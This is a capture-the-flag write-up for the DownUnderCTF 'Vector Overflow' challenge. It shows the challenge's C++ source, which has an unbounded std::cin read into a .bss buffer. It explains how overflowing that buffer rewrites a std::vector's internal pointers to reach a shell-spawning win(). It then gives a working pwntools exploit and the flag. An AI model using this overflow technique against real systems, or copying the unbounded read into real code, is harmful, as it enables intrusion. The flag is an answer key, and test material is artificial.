# DUCTF Vector Overflow

## chall
```c++
#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>

char buf[16];
std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};

void lose() {
    puts("Bye!");
    exit(1);
}

void win() {
    system("/bin/sh");
    exit(0);
}

int main() {
    char ductf[6] = "DUCTF";
    char* d = ductf;

    std::cin >> buf;
    if(v.size() == 5) {
        for(auto &c : v) {
            if(c != *d++) {
                lose();
            }
        }

        win();
    }

    lose();
}
```

## Approach
* overflow
  * std::cin is no limit to input. This cause buffer overflow.
```C++
    std::cin >> buf;
```
In this challenge, buf allocated in .bss region. I can overwrite the vector by buffer overflow.
 ```plain text
004051e0  buf:
004051f0  v:
```
* type of vector
  * _M_start has a pointer of the head of string
  * _M_finish has a pointer of the end of string
  * _M_end_of_storage has a pointer of the end of buffer
> `std::vector` allocates approximately twice the current capacity when it runs out of buffer.
```c++
typename _Tp_alloc_type::pointer _M_start;
typename _Tp_alloc_type::pointer _M_finish;
typename _Tp_alloc_type::pointer _M_end_of_storage;
```
When the .bss assembled like following, condition of program will be always true.
```plain text
004051e0  buf:
004051e0  'D' 'U' 'C' 'T' 'F' 'a' 'a' 'a' 'a' 'a' 'a' 'a' 'a' 'a' 'a' 'a' 
004051f0  v:
004051f0  0x4051e0 _M_start -> buf start
004051f8  0x4051e5 _M_finish -> buf end
00405200  0x4051e5 _M_end_of_storage -> buf end
```
## exploit
```python
from pwn import *

#e = ELF("vector_of")
#p = process("vector_of")
p = remote("2024.ductf.dev", 30013)

p.sendline(b"DUCTF"+b"a"*11 + p64(0x4051e0) + p64(0x4051e5) + p64(0x4051e5))

p.interactive()
```

## flag
DUCTF{y0u_pwn3d_th4t_vect0r!!}
